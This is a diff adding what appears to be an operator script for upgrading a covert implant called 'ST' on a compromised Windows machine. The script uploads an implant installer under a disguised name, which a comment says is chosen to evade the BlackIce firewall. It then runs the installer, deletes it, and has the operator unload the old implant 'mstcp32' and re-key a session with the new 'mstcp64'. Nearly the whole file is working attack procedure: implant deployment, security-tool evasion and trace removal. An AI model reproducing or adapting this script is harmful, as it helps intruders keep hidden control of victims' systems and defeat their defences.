@@ -1,0 +1,60 @@
+#08/22/2002 Simple script to upgrade ST 1.2 to ST 1.4 ...vrs
+#09/04/2002 changed spcss32.exe to spcss32.ex_ to evade Blackice 3.5
+
+@echo off;
+@record on;
+string $ScriptsDir;
+if(`getdirectory -scripts`) {
+  string $Dir = GetCmdData("dir");
+	$ScriptsDir = $Dir[0];
+}else{
+	$ScriptsDir="E:\\resources\\ep\\scripts";
+}
+@record off;
+@echo on;
+string $OPSDiskRoot = "$ScriptsDir\\..\\..\\..";
+`pwd`;
+
+echo "";
+echo "We should be in system32...now we upload the new version of ST";
+echo "";
+
+ifnot (`monitor put "$OPSDiskRoot\\exploits\\st 1.4\\install_implant_64.exe" -name spcss32.ex_`)
+{ echo "put of file failed";
+  return false;
+}
+
+echo "";
+echo "Wait for the put to finish, check the monitor window...then";
+echo "Make sure the whole file made it..should be 167,936 bytes";
+echo "";
+prompt `dir spcss*`;
+
+echo "";
+echo "Run the installer.";
+echo "";
+prompt `run -command spcss32.ex_`;
+
+echo "";
+echo "Make sure the process is done";
+echo "";
+prompt `processlist`;
+
+echo "";
+echo "Delete the installer.";
+echo "";
+prompt `del spcss32.ex_`;
+
+echo "";
+echo "Make sure it's gone.";
+echo "";
+prompt `dir spcss*`;
+
+echo "";
+echo "Now in the ST window don't for get to unload/delete the old implant";
+echo "old one should be mstcp32";
+echo "***Note you don NOT put the .sys on the end.";
+echo "";
+echo "After you send the Unload/Delete packet to the old implant try to ";
+echo "Ping it, it should time out. Upon succes re-establish the session key";
+echo "You should now be talking to the 1.4 implant named mstcp64";
